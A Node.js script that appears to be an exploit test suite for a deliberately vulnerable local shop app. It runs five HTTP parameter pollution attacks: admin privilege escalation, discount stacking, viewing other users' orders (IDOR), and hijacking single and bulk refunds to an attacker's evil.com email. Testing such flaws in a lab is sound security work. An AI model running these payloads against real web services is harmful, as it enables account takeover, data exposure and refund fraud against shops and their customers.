#!/usr/bin/env node

const http = require('http');

const HOST = 'localhost';
const PORT = 3000;

function request(method, path, body = null, cookies = '') {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: HOST,
            port: PORT,
            path: path,
            method: method,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': cookies
            }
        };

        if (body) {
            options.headers['Content-Length'] = Buffer.byteLength(body);
        }

        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    resolve({ 
                        status: res.statusCode,
                        data: JSON.parse(data),
                        cookies: res.headers['set-cookie'] || []
                    });
                } catch (e) {
                    resolve({ 
                        status: res.statusCode,
                        data: data,
                        cookies: res.headers['set-cookie'] || []
                    });
                }
            });
        });

        req.on('error', reject);
        if (body) req.write(body);
        req.end();
    });
}

function buildForm(params) {
    return params.map(([k, v]) => 
        `${encodeURIComponent(k)}=${encodeURIComponent(v)}`
    ).join('&');
}

function getCookie(cookies) {
    if (!cookies || cookies.length === 0) return '';
    return cookies[0].split(';')[0];
}

async function test1_PrivilegeEscalation() {
    console.log('\n[TEST 1] Privilege Escalation');
    
    const username = `hacker_${Date.now()}`;
    const attackData = buildForm([
        ['username', username],
        ['password', 'test123'],
        ['email', `${username}@evil.com`],
        ['is_admin', 'false'],
        ['is_admin', 'true']  // HPP
    ]);

    const res = await request('POST', '/api/register', attackData);
    
    if (!res.data.success) {
        console.log('❌ FAILED - Registration failed');
        return false;
    }
    
    const cookie = getCookie(res.cookies);
    
    // Check if we have admin access
    const sessionRes = await request('GET', '/api/session', null, cookie);
    
    if (sessionRes.data.isAdmin === true || 
        (Array.isArray(sessionRes.data.isAdmin) && 
         sessionRes.data.isAdmin[sessionRes.data.isAdmin.length - 1] === 'true')) {
        console.log('✅ SUCCESS - Got admin privileges!');
        console.log(`   isAdmin value: ${JSON.stringify(sessionRes.data.isAdmin)}`);
        return true;
    } else {
        console.log('❌ FAILED - No admin access');
        console.log(`   isAdmin value: ${JSON.stringify(sessionRes.data.isAdmin)}`);
        return false;
    }
}

async function test2_DiscountStacking() {
    console.log('\n[TEST 2] Discount Code Stacking');
    
    const username = `buyer_${Date.now()}`;
    
    // Register
    const regData = buildForm([
        ['username', username],
        ['password', 'test123'],
        ['email', `${username}@example.com`],
        ['is_admin', 'false']
    ]);
    await request('POST', '/api/register', regData);
    
    // Login
    const loginData = buildForm([
        ['username', username],
        ['password', 'test123']
    ]);
    const loginRes = await request('POST', '/api/login', loginData);
    const cookie = getCookie(loginRes.cookies);
    
    // Try stacking discounts
    const checkoutData = buildForm([
        ['product_id', '1'],
        ['quantity', '1'],
        ['discount_code', 'SAVE10'],
        ['discount_code', 'SAVE10'],
        ['discount_code', 'SAVE20'],
        ['shipping_method', 'standard']
    ]);
    
    const res = await request('POST', '/checkout/process', checkoutData, cookie);
    
    if (res.data.order_details) {
        const discounts = res.data.order_details.discount_codes;
        const finalPrice = parseFloat(res.data.order_details.final_total);
        
        if (discounts.length > 1) {
            console.log('✅ SUCCESS - Multiple discounts applied!');
            console.log(`   Discounts: ${discounts.join(', ')}`);
            console.log(`   Final price: $${finalPrice}`);
            console.log(`   Normal price would be: $904.99 (with single SAVE10)`);
            return true;
        } else {
            console.log('❌ FAILED - Only one discount applied');
            return false;
        }
    } else {
        console.log('❌ FAILED - Order processing failed');
        console.log(`   Error: ${res.data.error || 'Unknown'}`);
        return false;
    }
}

async function test3_IDOR() {
    console.log('\n[TEST 3] IDOR (View Other Users\' Orders)');
    
    // Login as bob (user_id=2, has no orders)
    const loginData = buildForm([
        ['username', 'bob'],
        ['password', 'password456']
    ]);
    const loginRes = await request('POST', '/api/login', loginData);
    const cookie = getCookie(loginRes.cookies);
    
    // Normal request: user_id=2 (should return empty or Bob's orders only)
    const normalRes = await request('GET', '/api/orders?user_id=2', null, cookie);
    const bobOrderCount = Array.isArray(normalRes.data) ? normalRes.data.length : 0;
    
    // HPP attack: user_id=2&user_id=1 (should return Alice's orders too)
    const attackRes = await request('GET', '/api/orders?user_id=2&user_id=1', null, cookie);
    
    if (Array.isArray(attackRes.data)) {
        const userIds = [...new Set(attackRes.data.map(o => o.userId))];
        const totalOrders = attackRes.data.length;
        
        // Success conditions:
        // 1. We got more orders than Bob alone has
        // 2. We see Alice's user_id (1) in the results
        // 3. We see any orders at all (since Bob has 0)
        if (userIds.includes(1) || (totalOrders > bobOrderCount && bobOrderCount === 0)) {
            console.log('✅ SUCCESS - Accessed other users\' orders!');
            console.log(`   Bob's orders: ${bobOrderCount}`);
            console.log(`   With HPP: ${totalOrders} orders from user(s): ${userIds.join(', ')}`);
            return true;
        } else {
            console.log('❌ FAILED - Did not access other users\' data');
            console.log(`   User IDs seen: ${userIds.join(', ')}`);
            return false;
        }
    } else {
        console.log('❌ FAILED - Access denied or error');
        console.log(`   Response: ${JSON.stringify(attackRes.data)}`);
        return false;
    }
}

async function test4_PaymentRedirect() {
    console.log('\n[TEST 4] Payment Redirect (Refund Hijacking)');
    
    // Create attacker account
    const attackerUsername = `attacker_${Date.now()}`;
    const regData = buildForm([
        ['username', attackerUsername],
        ['password', 'evil123'],
        ['email', `${attackerUsername}@evil.com`],
        ['is_admin', 'false']
    ]);
    await request('POST', '/api/register', regData);
    
    // Login as attacker
    const loginData = buildForm([
        ['username', attackerUsername],
        ['password', 'evil123']
    ]);
    const loginRes = await request('POST', '/api/login', loginData);
    const cookie = getCookie(loginRes.cookies);
    
    // Get attacker's initial balance
    const sessionBefore = await request('GET', '/api/session', null, cookie);
    const balanceBefore = sessionBefore.data.balance;
    
    // Alice's order #1000 is worth $564.99
    // Try to refund it with polluted email parameter
    const refundData = buildForm([
        ['order_id', '1000'],
        ['refund_email', 'alice@example.com'],  // First value
        ['refund_email', `${attackerUsername}@evil.com`]  // Second value (HPP)
    ]);
    
    const refundRes = await request('POST', '/api/refund', refundData, cookie);
    
    if (refundRes.data.success) {
        // Check if attacker's balance increased
        const sessionAfter = await request('GET', '/api/session', null, cookie);
        const balanceAfter = sessionAfter.data.balance;
        const gain = balanceAfter - balanceBefore;
        
        if (gain > 0) {
            console.log('✅ SUCCESS - Hijacked refund!');
            console.log(`   Alice's order value: $564.99`);
            console.log(`   Attacker balance before: $${balanceBefore}`);
            console.log(`   Attacker balance after: $${balanceAfter}`);
            console.log(`   Stolen: $${gain.toFixed(2)}`);
            return true;
        } else {
            console.log('❌ FAILED - No money gained');
            console.log(`   Balance: $${balanceBefore} → $${balanceAfter}`);
            return false;
        }
    } else {
        console.log('❌ FAILED - Refund request failed');
        console.log(`   Error: ${refundRes.data.error || 'Unknown'}`);
        return false;
    }
}

async function test5_BulkRefund() {
    console.log('\n[TEST 5] Bulk Refund Redirect');
    
    // Step 1: Create attacker account with admin privileges (using TEST 1 vulnerability)
    const adminUsername = `admin_${Date.now()}`;
    const regData = buildForm([
        ['username', adminUsername],
        ['password', 'admin123'],
        ['email', `${adminUsername}@evil.com`],
        ['is_admin', 'false'],
        ['is_admin', 'true']  // HPP to get admin
    ]);
    const regRes = await request('POST', '/api/register', regData);
    
    if (!regRes.data.success) {
        console.log('❌ FAILED - Registration failed');
        return false;
    }
    
    const regCookie = getCookie(regRes.cookies);
    
    // Verify we got admin access from registration
    const sessionCheck = await request('GET', '/api/session', null, regCookie);
    
    // Check if isAdmin is truthy (could be array or true)
    const hasAdmin = sessionCheck.data.isAdmin && 
                     (sessionCheck.data.isAdmin === true || 
                      Array.isArray(sessionCheck.data.isAdmin));
    
    if (!hasAdmin) {
        console.log('❌ FAILED - Could not get admin access via registration');
        console.log(`   isAdmin value: ${JSON.stringify(sessionCheck.data.isAdmin)}`);
        return false;
    }
    
    console.log(`   ✓ Got admin access (isAdmin: ${JSON.stringify(sessionCheck.data.isAdmin)})`);
    
    // Get initial balance
    const balanceBefore = sessionCheck.data.balance;
    
    // Alice has order #1001 ($304.98) - we already used #1000 in TEST 4
    // Try bulk refund with polluted recipient_email
    const bulkData = buildForm([
        ['order_ids', '1001'],  // Alice's second order
        ['recipient_email', 'alice@example.com'],  // First value
        ['recipient_email', `${adminUsername}@evil.com`]  // Second value (HPP)
    ]);
    
    const bulkRes = await request('POST', '/api/admin/bulk-refund', bulkData, regCookie);
    
    if (bulkRes.data.success) {
        // Check if attacker's balance increased
        const sessionAfter = await request('GET', '/api/session', null, regCookie);
        const balanceAfter = sessionAfter.data.balance;
        const gain = balanceAfter - balanceBefore;
        
        if (gain > 0) {
            console.log('✅ SUCCESS - Hijacked bulk refund!');
            console.log(`   Orders refunded: ${bulkRes.data.refundedCount}`);
            console.log(`   Total amount: $${bulkRes.data.totalAmount}`);
            console.log(`   Attacker balance before: $${balanceBefore}`);
            console.log(`   Attacker balance after: $${balanceAfter}`);
            console.log(`   Stolen: $${gain.toFixed(2)}`);
            return true;
        } else {
            console.log('❌ FAILED - No money gained');
            console.log(`   Balance: $${balanceBefore} → $${balanceAfter}`);
            console.log(`   Response: ${JSON.stringify(bulkRes.data)}`);
            return false;
        }
    } else {
        console.log('❌ FAILED - Bulk refund failed');
        console.log(`   Status: ${bulkRes.status}`);
        console.log(`   Error: ${bulkRes.data.error || 'Unknown'}`);
        return false;
    }
}

async function main() {
    console.log('═══════════════════════════════════════');
    console.log('  HPP Vulnerability Test Suite');
    console.log('═══════════════════════════════════════');
    
    let results = [];
    
    try {
        await request('GET', '/');
    } catch (e) {
        console.log('\n❌ Server not running on http://localhost:3000');
        console.log('   Start with: npm start\n');
        process.exit(1);
    }
    
    results.push(await test1_PrivilegeEscalation());
    results.push(await test2_DiscountStacking());
    results.push(await test3_IDOR());
    results.push(await test4_PaymentRedirect());
    results.push(await test5_BulkRefund());
    
    console.log('\n═══════════════════════════════════════');
    console.log('  Results Summary');
    console.log('═══════════════════════════════════════');
    
    const passed = results.filter(r => r === true).length;
    const failed = results.filter(r => r === false).length;
    const skipped = results.filter(r => r === null).length;
    
    console.log(`✅ Passed: ${passed}`);
    console.log(`❌ Failed: ${failed}`);
    console.log(`Skipped: ${skipped}`);
    console.log('');
}

main().catch(console.error);